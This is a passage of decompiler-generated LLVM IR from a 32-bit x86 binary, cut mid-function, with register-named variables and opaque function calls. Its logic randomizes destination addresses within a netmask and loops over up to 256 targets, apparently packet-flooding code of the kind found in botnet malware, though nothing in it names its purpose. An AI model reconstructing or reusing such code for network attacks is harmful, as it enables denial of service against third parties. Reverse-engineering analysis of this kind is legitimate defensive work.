  %v4_80482be216 = phi i32 [ %v1_80482d3, %dec_label_pc_80482cc ], [ 0, %dec_label_pc_804829d.preheader ]
  %v3_80482b8215 = phi i8* [ %v3_80482a0.pre, %dec_label_pc_80482cc ], [ %tmp238, %dec_label_pc_804829d.preheader ]
  %v2_80482bc = add i32 %v4_80482be216, %v4_80482a0217
  %v12_80482bc = icmp eq i32 %v2_80482bc, 0
  store i1 %v12_80482bc, i1* %zf.global-to-local, align 1
  store i32 %v2_80482bc, i32* %ecx.global-to-local, align 4
  %v1_80482be = inttoptr i32 %v2_80482bc to i8*
  %v2_80482be = load i8, i8* %v1_80482be, align 1
  %v3_80482be = zext i8 %v2_80482be to i32
  %v5_80482be = and i32 %v4_80482be216, -256
  %v6_80482be = or i32 %v3_80482be, %v5_80482be
  store i32 %v6_80482be, i32* %edx.global-to-local, align 4
  %v1_80482c0 = add i32 %v6_80482be, -97
  store i32 %v1_80482c0, i32* %eax.global-to-local, align 4
  %v1_80482c3 = trunc i32 %v1_80482c0 to i8
  %v11_80482c3 = icmp eq i8 %v1_80482c3, 25
  store i1 %v11_80482c3, i1* %zf.global-to-local, align 1
  %v8_80482c5 = icmp ugt i8 %v1_80482c3, 25
  br i1 %v8_80482c5, label %dec_label_pc_80482cc, label %dec_label_pc_80482c7

dec_label_pc_80482c7:                             ; preds = %dec_label_pc_80482b8
  %v1_80482c7 = add i32 %v6_80482be, -32
  store i32 %v1_80482c7, i32* %eax.global-to-local, align 4
  %v1_80482ca = trunc i32 %v1_80482c7 to i8
  store i8 %v1_80482ca, i8* %v1_80482be, align 1
  %v0_804829d.pre.pre = load i32, i32* @esp, align 4
  %v3_80482a0.pre.pre = load i8*, i8** %stack_var_-20900, align 4
  br label %dec_label_pc_80482cc

dec_label_pc_80482cc:                             ; preds = %dec_label_pc_80482b8, %dec_label_pc_80482c7
  %v3_80482a0.pre = phi i8* [ %v3_80482b8215, %dec_label_pc_80482b8 ], [ %v3_80482a0.pre.pre, %dec_label_pc_80482c7 ]
  %v0_804829d.pre = phi i32 [ %v15_8048194, %dec_label_pc_80482b8 ], [ %v0_804829d.pre.pre, %dec_label_pc_80482c7 ]
  %v1_80482d3 = add i32 %v4_80482be216, 1
  %v9_804829d = icmp eq i32 %v0_804829d.pre, 12
  store i1 %v9_804829d, i1* %zf.global-to-local, align 1
  %v4_80482a0 = ptrtoint i8* %v3_80482a0.pre to i32
  store i32 %v4_80482a0, i32* %eax.global-to-local, align 4
  store i32 %v4_80482a0, i32* %stack_var_-20972, align 4
  %v2_80482a5 = call i32 @function_80525e0(i8* %v3_80482a0.pre)
  store i32 %v2_80482a5, i32* %eax.global-to-local, align 4
  store i32 %v1_80482d3, i32* %edx.global-to-local, align 4
  %v12_80482b4 = icmp eq i32 %v2_80482a5, %v1_80482d3
  store i1 %v12_80482b4, i1* %zf.global-to-local, align 1
  %v7_80482b6 = icmp sgt i32 %v2_80482a5, %v1_80482d3
  br i1 %v7_80482b6, label %dec_label_pc_80482b8, label %dec_label_pc_80482dd

dec_label_pc_80482dd:                             ; preds = %dec_label_pc_80482cc, %dec_label_pc_804829d.preheader
  %v0_80482dd = load i32, i32* @edi, align 4
  %v7_80482e7 = icmp sgt i32 %v0_80482dd, 256
  %.v0_80482dd = select i1 %v7_80482e7, i32 256, i32 %v0_80482dd
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 36, i32* %stack_var_-20972, align 4
  %v2_80482f6 = call i32 @function_8051c90(i8 36)
  store i32 %v2_80482f6, i32* %eax.global-to-local, align 4
  store i32 37, i32* %stack_var_-20972, align 4
  %v2_8048302 = call i32 @function_8051c90(i8 37)
  store i32 %v2_8048302, i32* %eax.global-to-local, align 4
  store i32 38, i32* %stack_var_-20972, align 4
  %v2_804830e = call i32 @function_8051c90(i8 38)
  store i32 %v2_804830e, i32* %eax.global-to-local, align 4
  store i32 39, i32* %stack_var_-20972, align 4
  %v2_804831a = call i32 @function_8051c90(i8 39)
  store i32 %v2_804831a, i32* %eax.global-to-local, align 4
  store i32 40, i32* %stack_var_-20972, align 4
  %v2_8048326 = call i32 @function_8051c90(i8 40)
  store i32 %v2_8048326, i32* %eax.global-to-local, align 4
  store i32 41, i32* %stack_var_-20972, align 4
  %v2_8048332 = call i32 @function_8051c90(i8 41)
  store i32 %v2_8048332, i32* %eax.global-to-local, align 4
  store i32 42, i32* %stack_var_-20972, align 4
  %v2_804833e = call i32 @function_8051c90(i8 42)
  store i32 %v2_804833e, i32* %eax.global-to-local, align 4
  store i32 43, i32* %stack_var_-20972, align 4
  %v2_804834a = call i32 @function_8051c90(i8 43)
  store i32 %v2_804834a, i32* %eax.global-to-local, align 4
  store i32 44, i32* %stack_var_-20972, align 4
  %v2_8048356 = call i32 @function_8051c90(i8 44)
  store i32 %v2_8048356, i32* %eax.global-to-local, align 4
  store i32 45, i32* %stack_var_-20972, align 4
  %v2_8048362 = call i32 @function_8051c90(i8 45)
  store i32 %v2_8048362, i32* %eax.global-to-local, align 4
  store i32 46, i32* %stack_var_-20972, align 4
  %v2_804836e = call i32 @function_8051c90(i8 46)
  %v2_8048373 = load i32, i32* %stack_var_-20972, align 4
  store i32 %v2_8048373, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %.v0_80482dd, i32* @esi, align 4
  store i32 %.v0_80482dd, i32* %stack_var_-20972, align 4
  %v2_804837f = sext i32 %.v0_80482dd to i64
  %v3_804837f = call i32 @function_8053c88(i64 %v2_804837f, i32 3140)
  store i32 %v3_804837f, i32* %eax.global-to-local, align 4
  store i32 %v3_804837f, i32* @esi, align 4
  store i32 %.v0_80482dd, i32* @ebx, align 4
  %v1_8048391 = icmp eq i32 %.v0_80482dd, 0
  store i1 %v1_8048391, i1* %zf.global-to-local, align 1
  %tmp137 = icmp slt i32 %.v0_80482dd, 1
  br i1 %tmp137, label %dec_label_pc_80484be, label %dec_label_pc_8048399

dec_label_pc_8048399:                             ; preds = %dec_label_pc_80482dd
  %v0_8048399 = load i32, i32* @ebp, align 4
  %v1_8048399 = trunc i32 %v0_8048399 to i8
  store i32 0, i32* @ebp, align 4
  %v1_804839d6 = urem i32 %v0_8048399, 256
  %v3_804839d = icmp eq i8 %v1_8048399, 0
  store i1 %v3_804839d, i1* %zf.global-to-local, align 1
  store i32 %v1_804839d6, i32* @ecx, align 4
  %v2_80483e1 = inttoptr i32 %v1_804839d6 to i8*
  %v2_8049f7d = inttoptr i32 %tmp to i8*
  %v1_8049f3f = trunc i32 %tmp to i8
  %v2_804a072 = inttoptr i32 %v0_804816e to i32*
  br label %dec_label_pc_80483a7

dec_label_pc_80483a7:                             ; preds = %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge, %dec_label_pc_8048399
  %v0_80483a9 = phi i32 [ %v0_80483a9.pre, %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge ], [ %v3_804837f, %dec_label_pc_8048399 ]
  %v0_80483a7 = phi i32 [ %v4_8049f85, %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge ], [ 0, %dec_label_pc_8048399 ]
  store i32 %v0_80483a7, i32* %edx.global-to-local, align 4
  %v1_80483a9 = add i32 %v0_80483a9, 4
  %v2_80483a9 = inttoptr i32 %v1_80483a9 to i8*
  store i8 0, i8* %v2_80483a9, align 1
  %v0_80483ad = load i32, i32* %edx.global-to-local, align 4
  %v2_80483ad = ashr i32 %v0_80483ad, 31
  %v3_80483ad = icmp eq i32 %v2_80483ad, 0
  store i1 %v3_80483ad, i1* %zf.global-to-local, align 1
  store i32 %v2_80483ad, i32* %edx.global-to-local, align 4
  %v0_80483b0 = load i32, i32* @ebp, align 4
  store i32 %v0_80483b0, i32* %eax.global-to-local, align 4
  %v0_80483b2 = load i32, i32* @esp, align 4
  %v1_80483b2 = add i32 %v0_80483b2, 88
  %v2_80483b2 = inttoptr i32 %v1_80483b2 to i32*
  %v3_80483b2 = load i32, i32* %v2_80483b2, align 4
  %v5_80483b2 = zext i32 %v0_80483b0 to i64
  %v7_80483b2 = zext i32 %v2_80483ad to i64
  %v8_80483b2 = mul nuw i64 %v7_80483b2, 4294967296
  %v9_80483b2 = or i64 %v5_80483b2, %v8_80483b2
  %v10_80483b2 = zext i32 %v3_80483b2 to i64
  %v11_80483b2 = sdiv i64 %v9_80483b2, %v10_80483b2
  %v12_80483b2 = trunc i64 %v11_80483b2 to i32
  store i32 %v12_80483b2, i32* %eax.global-to-local, align 4
  %v13_80483b2 = srem i64 %v9_80483b2, %v10_80483b2
  %v14_80483b2 = trunc i64 %v13_80483b2 to i32
  store i32 %v14_80483b2, i32* %edx.global-to-local, align 4
  %v1_80483b6 = add i32 %v0_80483b2, 20932
  %v2_80483b6 = inttoptr i32 %v1_80483b6 to i32*
  %v3_80483b6 = load i32, i32* %v2_80483b6, align 4
  store i32 %v3_80483b6, i32* %eax.global-to-local, align 4
  %v0_80483bd = load i32, i32* @esi, align 4
  %v1_80483bd = inttoptr i32 %v0_80483bd to i32*
  store i32 -1, i32* %v1_80483bd, align 4
  %v0_80483c3 = load i32, i32* %edx.global-to-local, align 4
  %v0_80483c6 = load i32, i32* %eax.global-to-local, align 4
  %v2_80483c6 = mul i32 %v0_80483c3, 24
  %v3_80483c6 = add i32 %v0_80483c6, %v2_80483c6
  store i32 %v3_80483c6, i32* @edi, align 4
  %v0_80483c9 = load i32, i32* @esi, align 4
  %v1_80483c9 = add i32 %v0_80483c9, 532
  store i32 %v1_80483c9, i32* %edx.global-to-local, align 4
  %v1_80483cf = load i32, i32* @esp, align 4
  %v2_80483cf = add i32 %v1_80483cf, 36
  %v3_80483cf = inttoptr i32 %v2_80483cf to i32*
  store i32 %v1_80483c9, i32* %v3_80483cf, align 4
  %v0_80483d3 = load i32, i32* @edi, align 4
  %v1_80483d3 = add i32 %v0_80483d3, 16
  %v2_80483d3 = inttoptr i32 %v1_80483d3 to i32*
  %v3_80483d3 = load i32, i32* %v2_80483d3, align 4
  store i32 %v3_80483d3, i32* %eax.global-to-local, align 4
  %v1_80483d6 = load i32, i32* @esi, align 4
  %v2_80483d6 = add i32 %v1_80483d6, 16
  %v3_80483d6 = inttoptr i32 %v2_80483d6 to i32*
  store i32 %v3_80483d3, i32* %v3_80483d6, align 4
  %v0_80483d9 = load i32, i32* @ecx, align 4
  %v1_80483d9 = load i32, i32* @esp, align 4
  %v2_80483d9 = add i32 %v1_80483d9, -4
  %v3_80483d9 = inttoptr i32 %v2_80483d9 to i32*
  store i32 %v0_80483d9, i32* %v3_80483d9, align 4
  %v0_80483da = load i32, i32* @ecx, align 4
  %v2_80483da = add i32 %v1_80483d9, -8
  %v3_80483da = inttoptr i32 %v2_80483da to i32*
  store i32 %v0_80483da, i32* %v3_80483da, align 4
  %v1_80483db = add i32 %v1_80483d9, 64
  %v2_80483db = inttoptr i32 %v1_80483db to i32*
  %v3_80483db = load i32, i32* %v2_80483db, align 4
  store i32 %v3_80483db, i32* %eax.global-to-local, align 4
  %v2_80483df = add i32 %v1_80483d9, -12
  %v3_80483df = inttoptr i32 %v2_80483df to i32*
  store i32 %v3_80483db, i32* %v3_80483df, align 4
  %v0_80483e0 = load i32, i32* %edx.global-to-local, align 4
  %v2_80483e0 = add i32 %v1_80483d9, -16
  %v3_80483e0 = inttoptr i32 %v2_80483e0 to i32*
  store i32 %v0_80483e0, i32* %v3_80483e0, align 4
  %v3_80483e1 = call i32 @function_8052600(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80483e1, i32* %eax.global-to-local, align 4
  %v0_80483e6 = load i32, i32* @esp, align 4
  %v1_80483e6 = add i32 %v0_80483e6, 16
  %v6_80483e6 = icmp eq i32 %v1_80483e6, 0
  store i1 %v6_80483e6, i1* %zf.global-to-local, align 1
  %v0_80483e9 = load i32, i32* @esi, align 4
  %v1_80483e9 = add i32 %v0_80483e9, 532
  %v2_80483e9 = inttoptr i32 %v1_80483e9 to i8*
  %v3_80483e9 = load i8, i8* %v2_80483e9, align 1
  %v12_80483e9 = icmp eq i8 %v3_80483e9, 47
  store i1 %v12_80483e9, i1* %zf.global-to-local, align 1
  br i1 %v12_80483e9, label %dec_label_pc_804841e, label %dec_label_pc_80483f2

dec_label_pc_80483f2:                             ; preds = %dec_label_pc_80483a7
  %v9_80483f2 = icmp eq i32 %v0_80483e6, -4
  store i1 %v9_80483f2, i1* %zf.global-to-local, align 1
  %v1_80483f5 = add i32 %v0_80483e6, 52
  %v2_80483f5 = inttoptr i32 %v1_80483f5 to i32*
  %v3_80483f5 = load i32, i32* %v2_80483f5, align 4
  store i32 %v3_80483f5, i32* %eax.global-to-local, align 4
  %v3_80483f9 = inttoptr i32 %v0_80483e6 to i32*
  store i32 %v3_80483f5, i32* %v3_80483f9, align 4
  %v2_80483fa = call i32 @function_80525e0(i8* %v2_80483e1)
  store i32 %v2_80483fa, i32* %eax.global-to-local, align 4
  %v0_80483ff = load i32, i32* @esp, align 4
  %v9_80483ff = icmp eq i32 %v0_80483ff, -12
  store i1 %v9_80483ff, i1* %zf.global-to-local, align 1
  %v2_8048402 = add i32 %v0_80483ff, 8
  %v3_8048402 = inttoptr i32 %v2_8048402 to i32*
  store i32 %v2_80483fa, i32* %v3_8048402, align 4
  %v1_8048403 = add i32 %v0_80483ff, 52
  %v2_8048403 = inttoptr i32 %v1_8048403 to i32*
  %v3_8048403 = load i32, i32* %v2_8048403, align 4
  %v2_8048407 = add i32 %v0_80483ff, 4
  %v3_8048407 = inttoptr i32 %v2_8048407 to i32*
  store i32 %v3_8048403, i32* %v3_8048407, align 4
  %v0_8048408 = load i32, i32* @esi, align 4
  %v1_8048408 = add i32 %v0_8048408, 533
  store i32 %v1_8048408, i32* %eax.global-to-local, align 4
  %v3_804840e = inttoptr i32 %v0_80483ff to i32*
  store i32 %v1_8048408, i32* %v3_804840e, align 4
  %v4_804840f = call i32 @function_80530e3(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804840f, i32* %eax.global-to-local, align 4
  %v0_8048414 = load i32, i32* @esi, align 4
  %v1_8048414 = add i32 %v0_8048414, 532
  %v2_8048414 = inttoptr i32 %v1_8048414 to i8*
  store i8 47, i8* %v2_8048414, align 1
  %v0_804841b = load i32, i32* @esp, align 4
  %v1_804841b = add i32 %v0_804841b, 16
  %v6_804841b = icmp eq i32 %v1_804841b, 0
  store i1 %v6_804841b, i1* %zf.global-to-local, align 1
  %v0_804841e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804841e

dec_label_pc_804841e:                             ; preds = %dec_label_pc_80483a7, %dec_label_pc_80483f2
  %v1_804841e = phi i32 [ %v1_80483e6, %dec_label_pc_80483a7 ], [ %v1_804841b, %dec_label_pc_80483f2 ]
  %v0_804841e = phi i32 [ %v3_80483e1, %dec_label_pc_80483a7 ], [ %v0_804841e.pre, %dec_label_pc_80483f2 ]
  %v2_804841e = add i32 %v1_804841e, -4
  %v3_804841e = inttoptr i32 %v2_804841e to i32*
  store i32 %v0_804841e, i32* %v3_804841e, align 4
  %v0_804841f = load i32, i32* %eax.global-to-local, align 4
  %v2_804841f = add i32 %v1_804841e, -8
  %v3_804841f = inttoptr i32 %v2_804841f to i32*
  store i32 %v0_804841f, i32* %v3_804841f, align 4
  %v1_8048420 = add i32 %v1_804841e, 56
  %v2_8048420 = inttoptr i32 %v1_8048420 to i32*
  %v3_8048420 = load i32, i32* %v2_8048420, align 4
  %v2_8048424 = add i32 %v1_804841e, -12
  %v3_8048424 = inttoptr i32 %v2_8048424 to i32*
  store i32 %v3_8048420, i32* %v3_8048424, align 4
  %v0_8048425 = load i32, i32* @esi, align 4
  %v1_8048425 = add i32 %v0_8048425, 1440
  store i32 %v1_8048425, i32* %eax.global-to-local, align 4
  %v2_804842b = add i32 %v1_804841e, -16
  %v3_804842b = inttoptr i32 %v2_804842b to i32*
  store i32 %v1_8048425, i32* %v3_804842b, align 4
  %v3_804842c = call i32 @function_8052600(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804842c, i32* %eax.global-to-local, align 4
  %v0_8048431 = load i32, i32* @esp, align 4
  %v1_8048431 = inttoptr i32 %v0_8048431 to i32*
  %v2_8048431 = load i32, i32* %v1_8048431, align 4
  store i32 %v2_8048431, i32* @ebx, align 4
  %v0_8048433 = load i32, i32* @esi, align 4
  %v1_8048433 = add i32 %v0_8048433, 1431
  store i32 %v1_8048433, i32* %eax.global-to-local, align 4
  %v1_8048439 = add i32 %v0_8048431, 72
  %v2_8048439 = inttoptr i32 %v1_8048439 to i32*
  %v3_8048439 = load i32, i32* %v2_8048439, align 4
  store i32 %v3_8048439, i32* %ecx.global-to-local, align 4
  %v2_804843d = add i32 %v0_8048431, 4
  %v3_804843d = inttoptr i32 %v2_804843d to i32*
  store i32 %v3_8048439, i32* %v3_804843d, align 4
  %v0_804843e = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804843e, i32* %v1_8048431, align 4
  %v3_804843f = call i32 @function_8052600(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804843f, i32* %eax.global-to-local, align 4
  %v0_8048444 = load i32, i32* @esp, align 4
  %v1_8048444 = inttoptr i32 %v0_8048444 to i32*
  %v2_8048444 = load i32, i32* %v1_8048444, align 4
  store i32 %v2_8048444, i32* %eax.global-to-local, align 4
  %v3_8048444 = add i32 %v0_8048444, 4
  %v1_8048445 = inttoptr i32 %v3_8048444 to i32*
  %v2_8048445 = load i32, i32* %v1_8048445, align 4
  store i32 %v2_8048445, i32* %edx.global-to-local, align 4
  %v1_8048446 = add i32 %v0_8048444, 76
  %v2_8048446 = inttoptr i32 %v1_8048446 to i32*
  %v3_8048446 = load i32, i32* %v2_8048446, align 4
  store i32 %v3_8048446, i32* %v1_8048445, align 4
  %v0_804844b = load i32, i32* @esi, align 4
  %v1_804844b = add i32 %v0_804844b, 789
  store i32 %v1_804844b, i32* %eax.global-to-local, align 4
  store i32 %v1_804844b, i32* %v1_8048444, align 4
  %v3_8048452 = call i32 @function_8052600(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048452, i32* %eax.global-to-local, align 4
  %v0_8048457 = load i32, i32* @esp, align 4
  %v6_8048457 = icmp eq i32 %v0_8048457, -16
  store i1 %v6_8048457, i1* %zf.global-to-local, align 1
  %v0_804845a = load i32, i32* @edi, align 4
  %v1_804845a = add i32 %v0_804845a, 20
  %v2_804845a = inttoptr i32 %v1_804845a to i8*
  %v3_804845a = load i8, i8* %v2_804845a, align 1
  %v12_804845a = icmp eq i8 %v3_804845a, 31
  store i1 %v12_804845a, i1* %zf.global-to-local, align 1
  %tmp239 = icmp ult i8 %v3_804845a, 32
  br i1 %tmp239, label %dec_label_pc_8048460, label %dec_label_pc_804848a

dec_label_pc_8048460:                             ; preds = %dec_label_pc_804841e
  %v1_8048460 = add i32 %v0_804845a, 16
  %v2_8048460 = inttoptr i32 %v1_8048460 to i32*
  %v3_8048460 = load i32, i32* %v2_8048460, align 4
  store i32 %v3_8048460, i32* %ebx.global-to-local, align 4
  %v1_8048463 = call i32 @function_804fa00(i32 %v1_804839d6)
  store i32 %v1_8048463, i32* %eax.global-to-local, align 4
  %v1_8048468 = trunc i32 %v3_8048460 to i16
  %v2_8048468 = call i16 @llvm.bswap.i16(i16 %v1_8048468)
  %v3_8048468 = zext i16 %v2_8048468 to i32
  %v1_804846c = udiv i32 %v3_8048460, 65536
  %v2_804846c = mul nuw i32 %v3_8048468, 65536
  %v1_804846f = trunc i32 %v1_804846c to i16
  %v2_804846f = call i16 @llvm.bswap.i16(i16 %v1_804846f)
  %v3_804846f = zext i16 %v2_804846f to i32
  %v6_804846f = or i32 %v3_804846f, %v2_804846c
  store i32 %v6_804846f, i32* %ebx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_8048475 = load i32, i32* @edi, align 4
  %v1_8048475 = add i32 %v0_8048475, 20
  %v2_8048475 = inttoptr i32 %v1_8048475 to i8*
  %v3_8048475 = load i8, i8* %v2_8048475, align 1
  %v4_8048475 = zext i8 %v3_8048475 to i32
  store i32 %v4_8048475, i32* %ecx.global-to-local, align 4
  %tmp243 = urem i8 %v3_8048475, 32
  %v4_8048478 = icmp eq i8 %tmp243, 0
  br i1 %v4_8048478, label %bb138, label %bb

bb:                                               ; preds = %dec_label_pc_8048460
  %v2_8048478 = zext i8 %tmp243 to i32
  %v5_8048478 = lshr i32 %v1_8048463, %v2_8048478
  %v6_8048478 = icmp eq i32 %v5_8048478, 0
  store i1 %v6_8048478, i1* %zf.global-to-local, align 1
  store i32 %v5_8048478, i32* %eax.global-to-local, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_8048460, %bb
  %v0_804847a = phi i32 [ %v1_8048463, %dec_label_pc_8048460 ], [ %v5_8048478, %bb ]
  %v2_804847a = add i32 %v0_804847a, %v6_804846f
  %v12_804847a = icmp eq i32 %v2_804847a, 0
  store i1 %v12_804847a, i1* %zf.global-to-local, align 1
  %v1_804847c = trunc i32 %v2_804847a to i16
  %v2_804847c = call i16 @llvm.bswap.i16(i16 %v1_804847c)
  %v3_804847c = zext i16 %v2_804847c to i32
  %v1_8048480 = udiv i32 %v2_804847a, 65536
  %v2_8048480 = mul nuw i32 %v3_804847c, 65536
  %v1_8048483 = trunc i32 %v1_8048480 to i16
  %v2_8048483 = call i16 @llvm.bswap.i16(i16 %v1_8048483)
  %v3_8048483 = zext i16 %v2_8048483 to i32
  %v6_8048483 = or i32 %v3_8048483, %v2_8048480
  store i32 %v6_8048483, i32* %eax.global-to-local, align 4
  %v1_8048487 = load i32, i32* @esi, align 4
  %v2_8048487 = add i32 %v1_8048487, 16
  %v3_8048487 = inttoptr i32 %v2_8048487 to i32*
  store i32 %v6_8048483, i32* %v3_8048487, align 4
  br label %dec_label_pc_804848a

dec_label_pc_804848a:                             ; preds = %dec_label_pc_804841e, %bb138
  %v1_804848a = call i32 @function_804fa00(i32 %v1_804839d6)
  %v2_804848a = sext i32 %v1_804848a to i64
  store i32 -858993459, i32* @ecx, align 4
  store i32 %v1_804848a, i32* @ebx, align 4
  %v5_8048496 = mul nuw nsw i64 %v2_804848a, 3435973837
  %v6_8048496 = trunc i64 %v5_8048496 to i32
  %v7_8048496 = udiv i64 %v5_8048496, 4294967296
  %v8_8048496 = trunc i64 %v7_8048496 to i32
  store i32 %v6_8048496, i32* %eax.global-to-local, align 4
  store i32 %v8_8048496, i32* %edx.global-to-local, align 4
  %v1_8048498 = load i32, i32* @esp, align 4
  %v2_8048498 = add i32 %v1_8048498, 12
  %v3_8048498 = inttoptr i32 %v2_8048498 to i32*
  store i32 %v8_8048496, i32* %v3_8048498, align 4
  %v0_804849c = load i32, i32* %eax.global-to-local, align 4
  %v1_804849c = load i32, i32* @esp, align 4
  %v2_804849c = add i32 %v1_804849c, 8
  %v3_804849c = inttoptr i32 %v2_804849c to i32*
  store i32 %v0_804849c, i32* %v3_804849c, align 4
  %v0_80484a0 = load i32, i32* @esp, align 4
  %v1_80484a0 = add i32 %v0_80484a0, 12
  %v2_80484a0 = inttoptr i32 %v1_80484a0 to i32*
  %v3_80484a0 = load i32, i32* %v2_80484a0, align 4
  %v0_80484a4 = load i32, i32* @ebx, align 4
  %v2_80484a6 = udiv i32 %v3_80484a0, 4
  %v3_80484a9 = mul i32 %v2_80484a6, 5
  store i32 %v3_80484a9, i32* %edx.global-to-local, align 4
  %v2_80484ac = sub i32 %v0_80484a4, %v3_80484a9
  store i32 %v2_80484ac, i32* %eax.global-to-local, align 4
  %v9_80484ae = icmp eq i32 %v2_80484ac, 4
  store i1 %v9_80484ae, i1* %zf.global-to-local, align 1
  switch i32 %v2_80484ac, label %dec_label_pc_8049f6a [
    i32 0, label %dec_label_pc_8049f3a
    i32 1, label %dec_label_pc_8049fc3
    i32 2, label %dec_label_pc_8049ff8
    i32 3, label %dec_label_pc_804a062
  ]

dec_label_pc_80484be:                             ; preds = %dec_label_pc_80482dd
  %v1_80484be = add i32 %v3_804837f, 16
  store i32 %v1_80484be, i32* %edx.global-to-local, align 4
  %v2_80484c1 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_80484c1, i32* %ecx.global-to-local, align 4
  %v2_80484c8 = ptrtoint i32* %stack_var_-344 to i32
  store i32 %v2_80484c8, i32* %eax.global-to-local, align 4
  %v1_80484cf = add i32 %v3_804837f, 1452
  %v9_80484cf = icmp eq i32 %v1_80484cf, 0
  store i1 %v9_80484cf, i1* %zf.global-to-local, align 1
  store i32 %v1_80484cf, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80484e5.preheader

dec_label_pc_80484e5.preheader:                   ; preds = %dec_label_pc_80484be, %dec_label_pc_8049f8f
  %v0_80484e5.pre = phi i32 [ %v0_80484e5.pre.pre, %dec_label_pc_8049f8f ], [ %v15_8048194, %dec_label_pc_80484be ]
  %stack_var_-20924.0.ph = phi i32 [ %tmp, %dec_label_pc_8049f8f ], [ %v1_80484cf, %dec_label_pc_80484be ]
  %v1_80484ea = inttoptr i32 %stack_var_-20924.0.ph to i32*
  %v1_8048752 = inttoptr i32 %stack_var_-20924.0.ph to i8*
  %v1_804887b = trunc i32 %stack_var_-20924.0.ph to i8
  %v3_8048aab = sext i32 %stack_var_-20924.0.ph to i64
  br label %dec_label_pc_80484e5

dec_label_pc_80484e5:                             ; preds = %dec_label_pc_8048ce9, %dec_label_pc_8048cdd, %dec_label_pc_80484e5, %dec_label_pc_8048d91, %dec_label_pc_80484e5.preheader
  %v0_80484e5 = phi i32 [ %v0_80484e5.pre, %dec_label_pc_80484e5.preheader ], [ %v1_804850c, %dec_label_pc_80484e5 ], [ %v0_8048597, %dec_label_pc_8048cdd ], [ %v1_8048d39, %dec_label_pc_8048ce9 ], [ %v0_8048da7, %dec_label_pc_8048d91 ]
  %v9_80484e5 = icmp eq i32 %v0_80484e5, 12
  store i1 %v9_80484e5, i1* %zf.global-to-local, align 1
  %v1_80484e8 = add i32 %v0_80484e5, -16
  %v2_80484e8 = inttoptr i32 %v1_80484e8 to i32*
  store i32 0, i32* %v2_80484e8, align 4
  %v2_80484ea = call i32 @function_8052e42(i32* %v1_80484ea)
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_80484f4 = load i32, i32* @esp, align 4
  %v2_80484f4 = add i32 %v1_80484f4, 96
  %v3_80484f4 = inttoptr i32 %v2_80484f4 to i32*
  store i32 %v2_80484ea, i32* %v3_80484f4, align 4
  %v0_80484f8 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80484f8, i32* %ecx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80484fc = load i32, i32* @esp, align 4
  %v1_80484fc = add i32 %v0_80484fc, 40
  %v2_80484fc = inttoptr i32 %v1_80484fc to i32*
  %v3_80484fc = load i32, i32* %v2_80484fc, align 4
  %v4_80484fc = inttoptr i32 %v3_80484fc to i8*
  store i32 %v3_80484fc, i32* %edi.global-to-local, align 4
  %v5_8048501 = call i8* @_memset(i8* %v4_80484fc, i32 0, i32 %v0_80484f8)
  %v0_8048503 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8048503, i32* %ecx.global-to-local, align 4
  %v0_8048505 = load i32, i32* @esp, align 4
  %v1_8048505 = add i32 %v0_8048505, 36
  %v2_8048505 = inttoptr i32 %v1_8048505 to i32*
  %v3_8048505 = load i32, i32* %v2_8048505, align 4
  %v4_8048505 = inttoptr i32 %v3_8048505 to i8*
  store i32 %v3_8048505, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v2_804850a = load i32, i32* %eax.global-to-local, align 4
  %v5_804850a = call i8* @_memset(i8* %v4_8048505, i32 %v2_804850a, i32 %v0_8048503)
  %v6_804850a = ptrtoint i8* %v5_804850a to i32
  store i32 %v6_804850a, i32* @ecx, align 4
  %v0_804850c = load i32, i32* @esp, align 4
  %v1_804850c = add i32 %v0_804850c, 16
  %v1_804850f = add i32 %v0_804850c, 128
  %v2_804850f = inttoptr i32 %v1_804850f to i32*
  %v3_804850f = load i32, i32* %v2_804850f, align 4
  store i32 %v3_804850f, i32* %esi.global-to-local, align 4
  %v1_8048513 = icmp eq i32 %v3_804850f, 0
  store i1 %v1_8048513, i1* %zf.global-to-local, align 1
  %tmp139 = icmp slt i32 %v3_804850f, 1
  br i1 %tmp139, label %dec_label_pc_80484e5, label %dec_label_pc_8048517

dec_label_pc_8048517:                             ; preds = %dec_label_pc_80484e5
  %v1_8048517 = add i32 %v0_804850c, 64
  %v2_8048517 = inttoptr i32 %v1_8048517 to i32*
  %v3_8048517 = load i32, i32* %v2_8048517, align 4
  store i32 %v3_8048517, i32* %esi.global-to-local, align 4
  %v1_804851b = add i32 %v0_804850c, 44
  %v2_804851b = inttoptr i32 %v1_804851b to i32*
  %v3_804851b = load i32, i32* %v2_804851b, align 4
  store i32 %v3_804851b, i32* @ebp, align 4
  %v1_804851f = add i32 %v3_8048517, 1440
  %v6_804851f = icmp eq i32 %v1_804851f, 0
  store i1 %v6_804851f, i1* %zf.global-to-local, align 1
  store i32 %v1_804851f, i32* @esi, align 4
  %v1_8048525 = add i32 %v0_804850c, 116
  %v2_8048525 = inttoptr i32 %v1_8048525 to i32*
  store i32 0, i32* %v2_8048525, align 4
  %v0_804852d = load i32, i32* @esp, align 4
  %v1_804852d = add i32 %v0_804852d, 72
  %v2_804852d = inttoptr i32 %v1_804852d to i32*
  store i32 0, i32* %v2_804852d, align 4
  br label %dec_label_pc_80485a5

